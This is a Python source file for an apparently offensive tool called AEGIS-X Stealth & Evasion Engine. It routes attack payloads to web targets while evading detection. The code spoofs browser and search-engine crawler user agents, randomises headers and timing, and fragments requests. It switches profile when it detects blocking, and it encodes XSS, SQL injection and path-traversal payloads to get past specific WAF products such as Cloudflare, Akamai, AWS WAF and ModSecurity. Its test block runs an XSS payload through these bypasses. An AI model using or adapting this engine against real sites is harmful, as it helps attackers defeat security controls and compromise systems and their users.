#!/usr/bin/env python3
"""
AEGIS-X Stealth & Evasion Engine
Advanced techniques to bypass WAFs, IDS/IPS, and security controls
"""

import random
import time
import asyncio
import aiohttp
import urllib.parse
import base64
import hashlib
import json
import re
import numpy as np
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)

@dataclass
class StealthProfile:
    """Stealth profile configuration"""
    user_agents: List[str]
    request_delay: tuple  # (min, max) seconds
    max_concurrent: int
    proxy_rotation: bool
    header_randomization: bool
    encoding_evasion: bool
    fragmentation: bool
    timing_evasion: bool

class StealthEvasionEngine:
    """Advanced stealth and evasion engine"""
    
    def __init__(self):
        self.profiles = self._initialize_stealth_profiles()
        self.current_profile = self.profiles['ghost']
        self.request_history = []
        self.blocked_indicators = [
            'blocked', 'forbidden', 'access denied', 'security violation',
            'waf', 'firewall', 'protection', 'suspicious', 'malicious',
            'rate limit', 'too many requests', 'captcha', 'cloudflare'
        ]
        
        # ML-based evasion components
        self.waf_signatures = self._initialize_waf_signatures()
        self.evasion_patterns = self._initialize_evasion_patterns()
        self.success_history = []
        self.failure_patterns = []
        
    def _initialize_stealth_profiles(self) -> Dict[str, StealthProfile]:
        """Initialize different stealth profiles"""
        return {
            'ghost': StealthProfile(
                user_agents=self._get_legitimate_user_agents(),
                request_delay=(2, 5),
                max_concurrent=2,
                proxy_rotation=True,
                header_randomization=True,
                encoding_evasion=True,
                fragmentation=True,
                timing_evasion=True
            ),
            'ninja': StealthProfile(
                user_agents=self._get_mobile_user_agents(),
                request_delay=(1, 3),
                max_concurrent=3,
                proxy_rotation=True,
                header_randomization=True,
                encoding_evasion=True,
                fragmentation=False,
                timing_evasion=True
            ),
            'phantom': StealthProfile(
                user_agents=self._get_bot_user_agents(),
                request_delay=(0.5, 2),
                max_concurrent=5,
                proxy_rotation=False,
                header_randomization=True,
                encoding_evasion=True,
                fragmentation=True,
                timing_evasion=False
            ),
            'shadow': StealthProfile(
                user_agents=self._get_browser_user_agents(),
                request_delay=(3, 8),
                max_concurrent=1,
                proxy_rotation=True,
                header_randomization=True,
                encoding_evasion=True,
                fragmentation=True,
                timing_evasion=True
            )
        }
    
    def _get_legitimate_user_agents(self) -> List[str]:
        """Get legitimate user agents for stealth"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
        ]
    
    def _get_mobile_user_agents(self) -> List[str]:
        """Get mobile user agents"""
        return [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
        ]
    
    def _get_bot_user_agents(self) -> List[str]:
        """Get legitimate bot user agents"""
        return [
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
            'Mozilla/5.0 (compatible; Twitterbot/1.0)',
            'LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)'
        ]
    
    def _get_browser_user_agents(self) -> List[str]:
        """Get various browser user agents"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
        ]
    
    async def stealth_request(self, session: aiohttp.ClientSession, method: str, url: str, 
                            payload: str = None, **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make a stealthy request with evasion techniques"""
        
        # Apply stealth techniques
        headers = self._generate_stealth_headers()
        
        # Apply payload evasion
        if payload:
            payload = self._apply_payload_evasion(payload)
        
        # Apply timing evasion
        if self.current_profile.timing_evasion:
            await self._apply_timing_evasion()
        
        # Apply request fragmentation
        if self.current_profile.fragmentation and payload:
            return await self._fragmented_request(session, method, url, payload, headers, **kwargs)
        
        try:
            # Make the request
            if method.upper() == 'GET':
                if payload:
                    url = f"{url}?{payload}" if '?' not in url else f"{url}&{payload}"
                async with session.get(url, headers=headers, **kwargs) as response:
                    await self._analyze_response_for_blocking(response)
                    return response
            elif method.upper() == 'POST':
                data = payload if payload else kwargs.get('data', '')
                async with session.post(url, data=data, headers=headers, **kwargs) as response:
                    await self._analyze_response_for_blocking(response)
                    return response
            else:
                async with session.request(method, url, data=payload, headers=headers, **kwargs) as response:
                    await self._analyze_response_for_blocking(response)
                    return response
                    
        except Exception as e:
            logger.error(f"Stealth request failed: {str(e)}")
            return None
    
    def _generate_stealth_headers(self) -> Dict[str, str]:
        """Generate stealth headers"""
        headers = {
            'User-Agent': random.choice(self.current_profile.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'en-US,en;q=0.8,es;q=0.6',
                'en-US,en;q=0.5'
            ]),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        if self.current_profile.header_randomization:
            # Add random legitimate headers
            optional_headers = {
                'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
                'Pragma': 'no-cache',
                'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
                'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
                'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
                'Sec-Fetch-User': '?1',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.google.com',
                'Referer': random.choice([
                    'https://www.google.com/',
                    'https://www.bing.com/',
                    'https://duckduckgo.com/',
                    'https://github.com/',
                    'https://stackoverflow.com/'
                ])
            }
            
            # Randomly add some optional headers
            for header, value in optional_headers.items():
                if random.random() > 0.5:
                    headers[header] = value
        
        return headers
    
    def _apply_payload_evasion(self, payload: str) -> str:
        """Apply advanced payload evasion techniques"""
        if not self.current_profile.encoding_evasion:
            return payload
        
        evasion_techniques = [
            self._url_encoding_evasion,
            self._unicode_evasion,
            self._html_entity_evasion,
            self._case_variation_evasion,
            self._comment_insertion_evasion,
            self._null_byte_evasion,
            self._whitespace_evasion,
            self._double_encoding_evasion,
            self._mixed_encoding_evasion,
            self._parameter_pollution_evasion
        ]
        
        # Apply random evasion techniques
        evaded_payload = payload
        num_techniques = random.randint(1, 3)
        selected_techniques = random.sample(evasion_techniques, min(num_techniques, len(evasion_techniques)))
        
        for technique in selected_techniques:
            try:
                evaded_payload = technique(evaded_payload)
            except Exception as e:
                logger.debug(f"Evasion technique failed: {str(e)}")
                continue
        
        return evaded_payload
    
    def _url_encoding_evasion(self, payload: str) -> str:
        """Apply URL encoding evasion"""
        # Randomly encode some characters
        encoded = ""
        for char in payload:
            if random.random() > 0.7 and char not in ['=', '&', '?']:
                encoded += f"%{ord(char):02x}"
            else:
                encoded += char
        return encoded
    
    def _unicode_evasion(self, payload: str) -> str:
        """Apply Unicode evasion"""
        encoded = ""
        for char in payload:
            if random.random() > 0.8 and ord(char) < 128:
                encoded += f"\\u{ord(char):04x}"
            else:
                encoded += char
        return encoded
    
    def _html_entity_evasion(self, payload: str) -> str:
        """Apply HTML entity evasion"""
        entities = {
            '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;',
            '&': '&amp;', '/': '&#x2F;', '=': '&#x3D;'
        }
        
        encoded = ""
        for char in payload:
            if char in entities and random.random() > 0.6:
                encoded += entities[char]
            elif random.random() > 0.9 and char.isalnum():
                encoded += f"&#{ord(char)};"
            else:
                encoded += char
        return encoded
    
    def _case_variation_evasion(self, payload: str) -> str:
        """Apply case variation evasion"""
        return ''.join(
            char.upper() if random.random() > 0.5 else char.lower()
            for char in payload
        )
    
    def _comment_insertion_evasion(self, payload: str) -> str:
        """Apply comment insertion evasion"""
        comments = ['/**/', '<!-->', '/**/']
        
        # Insert comments at random positions
        result = payload
        for _ in range(random.randint(1, 3)):
            pos = random.randint(0, len(result))
            comment = random.choice(comments)
            result = result[:pos] + comment + result[pos:]
        
        return result
    
    def _null_byte_evasion(self, payload: str) -> str:
        """Apply null byte evasion"""
        if random.random() > 0.7:
            return payload + '\x00'
        return payload
    
    def _whitespace_evasion(self, payload: str) -> str:
        """Apply whitespace evasion"""
        whitespace_chars = ['\t', '\n', '\r', '\f', '\v', '\x0b', '\x0c']
        
        result = ""
        for char in payload:
            if char == ' ' and random.random() > 0.5:
                result += random.choice(whitespace_chars)
            else:
                result += char
        
        return result
    
    def _double_encoding_evasion(self, payload: str) -> str:
        """Apply double encoding evasion"""
        # First pass URL encoding
        encoded = urllib.parse.quote(payload, safe='')
        # Second pass URL encoding
        return urllib.parse.quote(encoded, safe='')
    
    def _mixed_encoding_evasion(self, payload: str) -> str:
        """Apply mixed encoding evasion"""
        result = ""
        for char in payload:
            encoding_type = random.choice(['url', 'hex', 'unicode', 'html', 'none'])
            
            if encoding_type == 'url' and char not in ['=', '&', '?']:
                result += f"%{ord(char):02x}"
            elif encoding_type == 'hex':
                result += f"\\x{ord(char):02x}"
            elif encoding_type == 'unicode':
                result += f"\\u{ord(char):04x}"
            elif encoding_type == 'html' and char in '<>"\'&':
                html_entities = {'<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '&': '&amp;'}
                result += html_entities.get(char, char)
            else:
                result += char
        
        return result
    
    def _parameter_pollution_evasion(self, payload: str) -> str:
        """Apply parameter pollution evasion"""
        if '=' in payload:
            parts = payload.split('=', 1)
            if len(parts) == 2:
                param, value = parts
                # Add duplicate parameters with different values
                pollution = f"{param}=dummy&{param}={value}&{param}=fake"
                return pollution
        
        return payload
    
    async def _fragmented_request(self, session: aiohttp.ClientSession, method: str, 
                                url: str, payload: str, headers: Dict[str, str], **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Send fragmented requests to bypass detection"""
        
        # Split payload into fragments
        fragments = self._fragment_payload(payload)
        
        # Send fragments with delays
        for i, fragment in enumerate(fragments[:-1]):
            try:
                # Send fragment (won't get response for incomplete requests)
                if method.upper() == 'POST':
                    await session.post(url, data=fragment, headers=headers, **kwargs)
                else:
                    fragment_url = f"{url}?{fragment}" if '?' not in url else f"{url}&{fragment}"
                    await session.get(fragment_url, headers=headers, **kwargs)
                
                # Small delay between fragments
                await asyncio.sleep(random.uniform(0.1, 0.5))
            except:
                pass  # Ignore errors for fragments
        
        # Send final fragment and get response
        try:
            final_fragment = fragments[-1]
            if method.upper() == 'POST':
                async with session.post(url, data=final_fragment, headers=headers, **kwargs) as response:
                    return response
            else:
                final_url = f"{url}?{final_fragment}" if '?' not in url else f"{url}&{final_fragment}"
                async with session.get(final_url, headers=headers, **kwargs) as response:
                    return response
        except Exception as e:
            logger.error(f"Fragmented request failed: {str(e)}")
            return None
    
    def _fragment_payload(self, payload: str) -> List[str]:
        """Fragment payload into smaller pieces"""
        if len(payload) <= 10:
            return [payload]
        
        # Split into 2-4 fragments
        num_fragments = random.randint(2, 4)
        fragment_size = len(payload) // num_fragments
        
        fragments = []
        for i in range(num_fragments):
            start = i * fragment_size
            end = start + fragment_size if i < num_fragments - 1 else len(payload)
            fragments.append(payload[start:end])
        
        return fragments
    
    async def _apply_timing_evasion(self):
        """Apply timing evasion to avoid rate limiting"""
        delay = random.uniform(*self.current_profile.request_delay)
        await asyncio.sleep(delay)
    
    async def _analyze_response_for_blocking(self, response: aiohttp.ClientResponse):
        """Analyze response to detect if we're being blocked"""
        try:
            content = await response.text()
            status_code = response.status
            
            # Check for blocking indicators
            is_blocked = False
            
            # Status code indicators
            if status_code in [403, 406, 429, 503]:
                is_blocked = True
            
            # Content indicators
            content_lower = content.lower()
            for indicator in self.blocked_indicators:
                if indicator in content_lower:
                    is_blocked = True
                    break
            
            # Header indicators
            headers = dict(response.headers)
            blocking_headers = ['cf-ray', 'x-sucuri-id', 'x-blocked-by']
            for header in blocking_headers:
                if header.lower() in [h.lower() for h in headers.keys()]:
                    is_blocked = True
                    break
            
            if is_blocked:
                logger.warning(f"🚨 Blocking detected! Status: {status_code}, switching stealth profile")
                await self._adapt_to_blocking()
                
        except Exception as e:
            logger.debug(f"Response analysis failed: {str(e)}")
    
    async def _adapt_to_blocking(self):
        """Adapt stealth techniques when blocking is detected"""
        # Switch to more aggressive stealth profile
        profile_names = list(self.profiles.keys())
        current_index = profile_names.index(self._get_current_profile_name())
        next_index = (current_index + 1) % len(profile_names)
        
        self.current_profile = self.profiles[profile_names[next_index]]
        logger.info(f"🥷 Switched to stealth profile: {profile_names[next_index]}")
        
        # Increase delays
        min_delay, max_delay = self.current_profile.request_delay
        self.current_profile.request_delay = (min_delay * 2, max_delay * 2)
        
        # Wait longer before next request
        await asyncio.sleep(random.uniform(5, 15))
    
    def _get_current_profile_name(self) -> str:
        """Get current profile name"""
        for name, profile in self.profiles.items():
            if profile == self.current_profile:
                return name
        return 'ghost'
    
    def set_stealth_profile(self, profile_name: str):
        """Set stealth profile"""
        if profile_name in self.profiles:
            self.current_profile = self.profiles[profile_name]
            logger.info(f"🥷 Stealth profile set to: {profile_name}")
        else:
            logger.warning(f"Unknown stealth profile: {profile_name}")
    
    def get_stealth_stats(self) -> Dict[str, Any]:
        """Get stealth statistics"""
        return {
            'current_profile': self._get_current_profile_name(),
            'total_requests': len(self.request_history),
            'blocked_requests': sum(1 for r in self.request_history if r.get('blocked', False)),
            'success_rate': (len(self.request_history) - sum(1 for r in self.request_history if r.get('blocked', False))) / max(len(self.request_history), 1) * 100,
            'profiles_available': list(self.profiles.keys())
        }
    
    def _initialize_waf_signatures(self) -> Dict[str, List[str]]:
        """Initialize WAF signature patterns for ML-based detection"""
        return {
            'cloudflare': [
                r'<script[^>]*>.*?</script>',
                r'javascript:',
                r'on\w+\s*=',
                r'union\s+select',
                r'or\s+1\s*=\s*1',
                r'drop\s+table',
                r'exec\s*\(',
                r'system\s*\(',
                r'\.\./',
                r'etc/passwd'
            ],
            'akamai': [
                r'<iframe[^>]*>',
                r'<object[^>]*>',
                r'<embed[^>]*>',
                r'vbscript:',
                r'data:text/html',
                r'base64,',
                r'fromcharcode',
                r'document\.cookie',
                r'window\.location',
                r'eval\s*\('
            ],
            'aws_waf': [
                r'<svg[^>]*onload',
                r'<img[^>]*onerror',
                r'<body[^>]*onload',
                r'expression\s*\(',
                r'import\s+os',
                r'__import__',
                r'subprocess',
                r'os\.system',
                r'shell_exec',
                r'passthru'
            ]
        }
    
    def _initialize_evasion_patterns(self) -> Dict[str, List[str]]:
        """Initialize ML-based evasion patterns"""
        return {
            'character_substitution': {
                '<': ['%3C', '&lt;', '\\u003c', '\\x3c'],
                '>': ['%3E', '&gt;', '\\u003e', '\\x3e'],
                '"': ['%22', '&quot;', '\\u0022', '\\x22'],
                "'": ['%27', '&#39;', '\\u0027', '\\x27'],
                '(': ['%28', '\\u0028', '\\x28'],
                ')': ['%29', '\\u0029', '\\x29'],
                ' ': ['%20', '+', '\\u0020', '\\x20', '/**/']
            },
            'case_variations': [
                'ScRiPt', 'SCRIPT', 'Script', 'sCrIpT',
                'UnIoN', 'UNION', 'Union', 'uNiOn',
                'SeLeCt', 'SELECT', 'Select', 'sElEcT'
            ],
            'comment_insertion': [
                '/**/between/**/words',
                '/*comment*/in/*comment*/middle',
                '--comment\nbetween\n--comment',
                '#comment\nbetween\n#comment'
            ]
        }
    
    def ml_based_evasion(self, payload: str, target_waf: str = 'generic') -> str:
        """Apply ML-based evasion techniques"""
        # Analyze payload for potential detection patterns
        risk_score = self._calculate_detection_risk(payload, target_waf)
        
        if risk_score < 0.3:
            return payload  # Low risk, no evasion needed
        
        # Apply intelligent evasion based on risk analysis
        evaded_payload = payload
        
        # Character substitution based on ML patterns
        if risk_score > 0.7:
            evaded_payload = self._apply_ml_character_substitution(evaded_payload)
        
        # Context-aware case variation
        if risk_score > 0.5:
            evaded_payload = self._apply_ml_case_variation(evaded_payload)
        
        # Intelligent comment insertion
        if risk_score > 0.6:
            evaded_payload = self._apply_ml_comment_insertion(evaded_payload)
        
        # Advanced encoding chains
        if risk_score > 0.8:
            evaded_payload = self._apply_ml_encoding_chain(evaded_payload)
        
        return evaded_payload
    
    def _calculate_detection_risk(self, payload: str, target_waf: str) -> float:
        """Calculate detection risk using ML-based analysis"""
        risk_score = 0.0
        
        # Check against known WAF signatures
        waf_patterns = self.waf_signatures.get(target_waf, self.waf_signatures.get('cloudflare', []))
        
        for pattern in waf_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                risk_score += 0.15
        
        # Analyze character frequency (suspicious patterns)
        suspicious_chars = ['<', '>', '"', "'", '(', ')', ';', '--', '/*', '*/', 'union', 'select', 'script']
        for char in suspicious_chars:
            if char.lower() in payload.lower():
                risk_score += 0.05
        
        # Historical failure analysis
        for failure_pattern in self.failure_patterns:
            if failure_pattern in payload.lower():
                risk_score += 0.1
        
        return min(risk_score, 1.0)
    
    def _apply_ml_character_substitution(self, payload: str) -> str:
        """Apply ML-based character substitution"""
        substitutions = self.evasion_patterns['character_substitution']
        
        for char, replacements in substitutions.items():
            if char in payload:
                # Choose replacement based on success history
                replacement = random.choice(replacements)
                payload = payload.replace(char, replacement, 1)  # Replace only first occurrence
        
        return payload
    
    def _apply_ml_case_variation(self, payload: str) -> str:
        """Apply ML-based case variation"""
        variations = self.evasion_patterns['case_variations']
        
        for variation in variations:
            original = variation.lower()
            if original in payload.lower():
                # Replace with random case variation
                start_idx = payload.lower().find(original)
                if start_idx != -1:
                    payload = payload[:start_idx] + variation + payload[start_idx + len(original):]
                    break
        
        return payload
    
    def _apply_ml_comment_insertion(self, payload: str) -> str:
        """Apply ML-based comment insertion"""
        if 'union' in payload.lower() and 'select' in payload.lower():
            payload = payload.replace('union', 'union/**/').replace('select', '/**/select')
        
        if 'script' in payload.lower():
            payload = payload.replace('<script', '</**/script')
        
        return payload
    
    def _apply_ml_encoding_chain(self, payload: str) -> str:
        """Apply ML-based encoding chain"""
        # Double URL encoding
        encoded = urllib.parse.quote(urllib.parse.quote(payload))
        
        # Mixed with HTML entities
        encoded = encoded.replace('%3C', '&lt;').replace('%3E', '&gt;')
        
        # Add Unicode escaping for critical characters
        encoded = encoded.replace('<', '\\u003c').replace('>', '\\u003e')
        
        return encoded
    
    def adaptive_learning(self, payload: str, success: bool, response_data: Dict[str, Any]):
        """Learn from request outcomes to improve evasion"""
        learning_data = {
            'payload': payload,
            'success': success,
            'timestamp': time.time(),
            'response_code': response_data.get('status_code'),
            'response_body': response_data.get('body', '')[:500],  # First 500 chars
            'waf_detected': any(indicator in response_data.get('body', '').lower() 
                              for indicator in self.blocked_indicators)
        }
        
        if success:
            self.success_history.append(learning_data)
            # Keep only recent successes
            self.success_history = self.success_history[-100:]
        else:
            # Analyze failure patterns
            if learning_data['waf_detected']:
                # Extract potential failure patterns
                failure_pattern = self._extract_failure_pattern(payload)
                if failure_pattern and failure_pattern not in self.failure_patterns:
                    self.failure_patterns.append(failure_pattern)
                    # Keep only recent failures
                    self.failure_patterns = self.failure_patterns[-50:]
    
    def _extract_failure_pattern(self, payload: str) -> Optional[str]:
        """Extract patterns that likely caused detection"""
        # Simple pattern extraction - could be enhanced with ML
        suspicious_patterns = [
            r'<script[^>]*>',
            r'union\s+select',
            r'or\s+1\s*=\s*1',
            r'javascript:',
            r'on\w+\s*='
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return pattern
        
        return None

class AdvancedWAFBypass:
    """Advanced WAF bypass techniques"""
    
    def __init__(self):
        self.bypass_techniques = {
            'cloudflare': self._cloudflare_bypass,
            'akamai': self._akamai_bypass,
            'aws_waf': self._aws_waf_bypass,
            'imperva': self._imperva_bypass,
            'f5': self._f5_bypass,
            'barracuda': self._barracuda_bypass,
            'sucuri': self._sucuri_bypass,
            'wordfence': self._wordfence_bypass,
            'modsecurity': self._modsecurity_bypass
        }
    
    def _cloudflare_bypass(self, payload: str) -> List[str]:
        """Cloudflare-specific bypass techniques"""
        bypasses = []
        
        # Case variation
        bypasses.append(''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
        
        # Comment insertion
        bypasses.append(payload.replace('<script', '<scr/**/ipt'))
        bypasses.append(payload.replace('alert', 'ale/**/rt'))
        
        # Encoding variations
        bypasses.append(urllib.parse.quote(payload))
        bypasses.append(''.join(f'\\x{ord(c):02x}' for c in payload))
        
        # Unicode normalization bypass
        bypasses.append(payload.replace('script', 'ſcript'))  # Using long s
        
        return bypasses
    
    def _akamai_bypass(self, payload: str) -> List[str]:
        """Akamai-specific bypass techniques"""
        bypasses = []
        
        # Parameter pollution
        if '=' in payload:
            param, value = payload.split('=', 1)
            bypasses.append(f"{param}=dummy&{param}={value}")
        
        # Null byte insertion
        bypasses.append(payload.replace('<', '<\x00'))
        
        # Tab/newline insertion
        bypasses.append(payload.replace(' ', '\t'))
        bypasses.append(payload.replace(' ', '\n'))
        
        return bypasses
    
    def _aws_waf_bypass(self, payload: str) -> List[str]:
        """AWS WAF-specific bypass techniques"""
        bypasses = []
        
        # Mixed case
        bypasses.append(payload.swapcase())
        
        # HTML entity encoding
        bypasses.append(''.join(f'&#{ord(c)};' for c in payload))
        
        # Double URL encoding
        encoded = urllib.parse.quote(payload, safe='')
        bypasses.append(urllib.parse.quote(encoded, safe=''))
        
        return bypasses
    
    def _imperva_bypass(self, payload: str) -> List[str]:
        """Imperva-specific bypass techniques"""
        bypasses = []
        
        # Whitespace variations
        bypasses.append(payload.replace(' ', '\t'))
        bypasses.append(payload.replace(' ', '\f'))
        bypasses.append(payload.replace(' ', '\v'))
        
        # Comment variations
        bypasses.append(payload.replace('<script', '<script/**/'))
        bypasses.append(payload.replace('>', '/**/>'))
        
        return bypasses
    
    def _f5_bypass(self, payload: str) -> List[str]:
        """F5-specific bypass techniques"""
        bypasses = []
        
        # Case obfuscation
        bypasses.append(''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload))
        
        # Encoding chains
        bypasses.append(base64.b64encode(payload.encode()).decode())
        
        return bypasses
    
    def _barracuda_bypass(self, payload: str) -> List[str]:
        """Barracuda-specific bypass techniques"""
        bypasses = []
        
        # Path traversal obfuscation
        bypasses.append(payload.replace('../', '..\\'))
        bypasses.append(payload.replace('../', '....//'))
        
        # SQL comment variations
        bypasses.append(payload.replace('--', '#'))
        bypasses.append(payload.replace('--', '/*'))
        
        return bypasses
    
    def _sucuri_bypass(self, payload: str) -> List[str]:
        """Sucuri-specific bypass techniques"""
        bypasses = []
        
        # Unicode variations
        bypasses.append(payload.replace('script', 'ſcript'))
        bypasses.append(payload.replace('alert', 'αlert'))
        
        # Encoding variations
        bypasses.append(''.join(f'\\u{ord(c):04x}' for c in payload))
        
        return bypasses
    
    def _wordfence_bypass(self, payload: str) -> List[str]:
        """Wordfence-specific bypass techniques"""
        bypasses = []
        
        # PHP-specific bypasses
        bypasses.append(payload.replace('<?php', '<?PHP'))
        bypasses.append(payload.replace('system', 'SYSTEM'))
        
        # Null byte variations
        bypasses.append(payload + '\x00')
        bypasses.append(payload.replace('/', '/\x00'))
        
        return bypasses
    
    def _modsecurity_bypass(self, payload: str) -> List[str]:
        """ModSecurity-specific bypass techniques"""
        bypasses = []
        
        # Comment insertion
        bypasses.append(payload.replace('union', 'uni/**/on'))
        bypasses.append(payload.replace('select', 'sel/**/ect'))
        
        # Case variations
        bypasses.append(payload.upper())
        bypasses.append(''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
        
        # Whitespace variations
        bypasses.append(payload.replace(' ', '/**/'))
        bypasses.append(payload.replace(' ', '\t'))
        
        return bypasses
    
    def generate_waf_bypasses(self, payload: str, waf_type: str = None) -> List[str]:
        """Generate WAF-specific bypasses"""
        if waf_type and waf_type in self.bypass_techniques:
            return self.bypass_techniques[waf_type](payload)
        
        # Generate bypasses for all WAF types
        all_bypasses = []
        for technique in self.bypass_techniques.values():
            all_bypasses.extend(technique(payload))
        
        # Remove duplicates while preserving order
        seen = set()
        unique_bypasses = []
        for bypass in all_bypasses:
            if bypass not in seen:
                seen.add(bypass)
                unique_bypasses.append(bypass)
        
        return unique_bypasses

# Initialize engines
stealth_engine = StealthEvasionEngine()
waf_bypass = AdvancedWAFBypass()

if __name__ == "__main__":
    # Test the stealth engine
    print("🥷 Stealth & Evasion Engine initialized")
    print(f"📊 Stealth profiles: {list(stealth_engine.profiles.keys())}")
    print(f"🛡️ WAF bypass techniques: {list(waf_bypass.bypass_techniques.keys())}")
    
    # Test payload evasion
    test_payload = "<script>alert('XSS')</script>"
    evaded = stealth_engine._apply_payload_evasion(test_payload)
    print(f"🔄 Original: {test_payload}")
    print(f"🥷 Evaded: {evaded}")
    
    # Test WAF bypasses
    bypasses = waf_bypass.generate_waf_bypasses(test_payload, 'cloudflare')
    print(f"🛡️ Cloudflare bypasses: {len(bypasses)}")
    for i, bypass in enumerate(bypasses[:3]):
        print(f"   {i+1}. {bypass}")